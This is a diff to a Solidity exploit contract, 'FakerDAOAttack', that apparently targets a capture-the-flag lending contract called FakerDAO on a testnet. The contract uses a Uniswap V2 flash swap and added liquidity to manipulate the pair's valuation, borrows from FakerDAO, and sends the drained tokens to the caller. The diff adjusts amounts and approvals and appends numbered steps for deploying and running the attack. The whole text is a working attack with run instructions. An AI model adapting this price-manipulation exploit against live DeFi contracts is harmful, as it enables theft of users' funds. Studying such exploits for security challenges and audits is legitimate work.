@@ -1,6 +1,6 @@
 import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
 import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
-import "./IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract FakerDAOAttack is IUniswapV2Callee {
     using SafeMath for uint256;
@@ -16,11 +16,12 @@ contract FakerDAOAttack is IUniswapV2Callee {
 
         IERC20(token0).approve(_router, uint256(-1));
         IERC20(token1).approve(_router, uint256(-1));
+        IERC20(_pair).approve(instance, uint256(-1));
         (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(
           token0,
           token1,
-          1000 * 10 ** 18,
-          1000 * 10 ** 18,
+          1500 * 10 ** 18,
+          1500 * 10 ** 18,
           1, 1, address(this), uint256(-1));
 
 
@@ -49,7 +50,7 @@ contract FakerDAOAttack is IUniswapV2Callee {
           'Unauthorized'
         );
 
-        FakerDAO(instance).borrow(1 * 10 ** 18);
+        FakerDAO(instance).borrow(1);
 
         IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));
         IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
@@ -62,7 +63,7 @@ library $
 	address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten
 }
 
-interface FakerDAO {
+interface FakerDAO is IERC20 {
     function borrow(uint256 _amount) external;
 }
 
@@ -99,3 +100,13 @@ interface Pair is IERC20
 	function sync() external;
 	function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
 }
+
+
+/**
+ * steps:
+ * 1) get token0 and token1 on contract.pair
+ * 2) deploy FakerDAOAttack
+ * 3) token0.transfer(FakerDAOAttack, 5000000000000000000000)
+ * 4) token1.transfer(FakerDAOAttack, 5000000000000000000000)
+ * 5) FakerDAOAttack.attack(instance, pair, 1, 999999999999999999999999)
+*/
